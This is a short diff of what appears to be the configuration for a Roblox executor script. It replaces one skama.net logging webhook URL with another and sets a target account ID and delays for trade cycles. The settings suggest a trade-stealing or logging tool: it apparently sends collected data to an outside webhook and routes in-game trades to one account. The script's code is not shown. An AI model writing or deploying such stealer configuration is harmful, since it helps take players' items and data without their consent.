@@ -1,4 +1,4 @@
-getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_a1da419a072945659e71f58c4ae7ca80"
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_d4cf6e41639744f4ad4dccb48a8df109"
 getgenv().TARGET_ID = 7807063904
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
